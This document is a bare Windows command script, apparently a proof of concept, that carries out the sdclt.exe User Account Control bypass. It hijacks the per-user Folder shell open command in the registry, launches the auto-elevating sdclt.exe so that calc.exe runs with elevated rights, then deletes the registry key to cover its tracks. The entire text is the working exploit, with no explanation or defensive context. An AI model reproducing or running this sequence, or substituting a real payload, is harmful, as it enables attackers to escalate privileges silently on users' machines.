c:\windows\system32\cmd.exe /c 'reg add "HKCU\Software\Classes\Folder\shell\open\command" /d "cmd.exe /c calc.exe" /f && reg add HKCU\Software\Classes\Folder\shell\open\command /v "DelegateExecute" /f'
c:\windows\system32\sdclt.exe
Timeout /T 10
c:\windows\system32\cmd.exe /c 'reg delete "HKCU\Software\Classes\Folder\shell\open\command" /f'